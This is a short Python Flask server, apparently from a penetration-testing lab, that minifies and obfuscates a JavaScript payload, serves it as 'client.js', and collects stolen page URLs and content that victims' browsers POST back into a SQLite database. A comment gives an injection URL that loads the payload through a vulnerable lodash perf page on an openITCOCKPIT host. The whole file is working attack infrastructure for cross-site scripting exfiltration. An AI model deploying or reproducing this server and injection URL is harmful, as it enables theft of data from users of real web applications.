from flask import Flask, request, send_file
from db import create_connection, insert_content, create_db
from flask_cors import CORS
from jsmin import jsmin
import os

app = Flask(__name__)
CORS(app)
database = r"sqlite.db"

os.system("uglifyjs --ie8 --toplevel -m -c -o payload.ugly.js payload.js")

with open('./payload.js') as js_file:
    minified = jsmin(js_file.read())
    with open("payload.min.js", 'w') as outputfile:
        outputfile.write(minified)

@app.route('/data', methods=['POST'])
def content():
    conn = create_connection(database)
    url = request.form["url"]
    content = request.form["content"]
    insert_content(conn, (url, content))
    conn.commit()
    print("[+] Received Page: %s" % url,)
    return ""

@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./payload.ugly.js', attachment_filename='client.js')

app.run(host='0.0.0.0', port=9444)
app.run(host='0.0.0.0', port=9445, ssl_context=('cert.pem', 'key.pem'))


# sudo pip3 install flask_cors
# sudo apt-get install node-uglify
# openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
# https://192.168.119.140:9443/client.js
# https://openitcockpit/js/vendor/lodash/perf/index.html?build=https://192.168.119.140:9444/client.js
# sudo apt install npm
# sudo npm install --save-dev javascript-obfuscator